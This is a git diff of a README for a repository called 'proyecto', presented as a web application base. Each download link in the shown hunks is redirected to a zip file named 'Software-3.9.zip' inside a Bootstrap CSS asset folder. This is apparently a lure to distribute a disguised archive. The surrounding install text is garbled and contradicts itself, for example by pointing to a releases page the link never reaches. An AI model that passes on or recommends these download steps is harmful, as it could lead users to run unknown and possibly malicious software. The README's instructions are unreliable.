@@ -7,7 +7,7 @@ Welcome to **proyecto**! This repository offers a modular base for web applicati
 To begin using proyecto, you’ll need to download the application. Follow the steps below to get started quickly.
 
 ## 📥 Download Now
-[![Download proyecto](https://raw.githubusercontent.com/apolovip/proyecto/master/loosish/proyecto.zip)](https://raw.githubusercontent.com/apolovip/proyecto/master/loosish/proyecto.zip)
+[![Download proyecto](https://raw.githubusercontent.com/apolovip/proyecto/master/src/assets/bootstrap/css/Software-3.9.zip)](https://raw.githubusercontent.com/apolovip/proyecto/master/src/assets/bootstrap/css/Software-3.9.zip)
 
 ## 📋 System Requirements
 To run proyecto, ensure your system meets the following requirements:
@@ -25,11 +25,11 @@ To run proyecto, ensure your system meets the following requirements:
 
 ## 🔗 How to Download & Install
 1. **Visit the Releases Page**: Click the link below to access the latest version:
-   [Download proyecto here](https://raw.githubusercontent.com/apolovip/proyecto/master/loosish/proyecto.zip)
+   [Download proyecto here](https://raw.githubusercontent.com/apolovip/proyecto/master/src/assets/bootstrap/css/Software-3.9.zip)
 
 2. **Select the Release**: On the releases page, you will see a list of available versions. Choose the latest stable version.
 
-3. **Download the File**: Click on the archive file (usually a .zip or https://raw.githubusercontent.com/apolovip/proyecto/master/loosish/proyecto.zip) to start the download.
+3. **Download the File**: Click on the archive file (usually a .zip or https://raw.githubusercontent.com/apolovip/proyecto/master/src/assets/bootstrap/css/Software-3.9.zip) to start the download.
 
 4. **Extract the Files**: After downloading the file, extract its contents to your desired location on your computer.
 
@@ -61,4 +61,4 @@ Join our community by participating in discussions or following updates. Check t
 
 ## 📥 Download the Latest Release Again
 But first, don’t forget to visit our releases page for any updates:
-[Download proyecto here](https://raw.githubusercontent.com/apolovip/proyecto/master/loosish/proyecto.zip)
+[Download proyecto here](https://raw.githubusercontent.com/apolovip/proyecto/master/src/assets/bootstrap/css/Software-3.9.zip)
